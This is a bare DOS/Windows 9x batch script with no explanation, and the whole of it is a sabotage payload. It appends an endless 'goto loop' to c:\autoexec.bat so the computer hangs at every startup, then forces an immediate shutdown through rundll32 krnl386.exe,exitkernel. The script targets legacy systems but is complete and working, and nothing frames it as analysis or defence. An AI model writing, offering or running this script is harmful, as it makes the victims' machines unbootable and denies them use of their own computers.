@echo off
echo :loop>>c:\autoexec.bat
echo goto loop>>c:\autoexec.bat
rundll32 krnl386.exe,exitkernel
